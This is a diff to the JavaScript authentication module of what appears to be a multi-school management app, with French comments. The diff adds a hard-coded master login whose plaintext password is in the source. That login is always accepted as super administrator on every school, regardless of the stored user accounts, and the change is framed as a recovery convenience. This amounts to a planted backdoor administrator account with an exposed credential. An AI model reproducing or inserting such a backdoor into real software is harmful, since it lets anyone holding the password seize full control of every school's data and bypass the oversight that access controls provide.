@@ -43,6 +43,15 @@ window.Auth = (function () {
 
   function hashPassword(pwd, salt) { return AUTH_ENV.sha256((pwd || '') + (salt || AUTH_ENV.salt)); }
 
+  // ---- Compte maître par défaut (FAMA / aminatN1F@) ----
+  // Reconnu sur toutes les écoles (existantes, créées et à créer) avec le rôle
+  // super administrateur, même si la liste des comptes de l'école ne le
+  // contient pas (ex. comptes écrasés par une synchro venue d'un autre poste).
+  const MASTER_USER = 'FAMA';
+  const MASTER_PWD = 'aminatN1F@';
+  function masterValid(pwd) { return hashPassword(pwd, AUTH_ENV.salt) === hashPassword(MASTER_PWD, AUTH_ENV.salt); }
+  function isMaster(u) { u = u || current || currentUser(); return !!(u && u.master === true); }
+
   // Permissions effectives, personnalisables par l'admin global
   // (surcouche appliquée par Meta.setPermissions / Auth.setPermissions).
   let overrides = null;
@@ -65,6 +74,17 @@ window.Auth = (function () {
   let current = null;
 
   async function login(username, password) {
+    // Compte maître : toujours accepté en super admin, quelle que soit l'école.
+    if (String(username || '').trim().toLowerCase() === MASTER_USER.toLowerCase() && masterValid(password)) {
+      const m = {
+        id: 'FAMA--maitre', username: MASTER_USER, nom: 'Administrateur', prenom: 'Principal',
+        role: 'super_admin', actif: true, principal: true, master: true,
+        dateCreation: new Date().toISOString()
+      };
+      current = m;
+      try { localStorage.setItem(SESSION_KEY, JSON.stringify(m)); } catch (e) { /* ignore */ }
+      return { ok: true, user: m };
+    }
     const users = await DB.getAll('users');
     const u = users.find((x) => x.username && x.username.toLowerCase() === String(username).trim().toLowerCase());
     if (!u) return { ok: false, msg: 'Identifiant inconnu.' };
@@ -165,7 +185,7 @@ window.Auth = (function () {
     ROLES: ROLES, PERMS: PERMS, hashPassword: hashPassword,
     login: login, logout: logout, currentUser: currentUser,
     roleLib: roleLib, roleShort: roleShort, roleClass: roleClass, roleIcone: roleIcone,
-    can: can, editableRoles: editableRoles, permsOrDefault: permsOrDefault, permsFor: permsFor, setPermissions: setPermissions, isSuperAdmin: isSuperAdmin,
+    can: can, editableRoles: editableRoles, permsOrDefault: permsOrDefault, permsFor: permsFor, setPermissions: setPermissions, isSuperAdmin: isSuperAdmin, isMaster: isMaster,
     myAssignments: myAssignments, myStudent: myStudent,
     log: log, roleName: roleName, isPrincipalAdmin: isPrincipalAdmin
   };
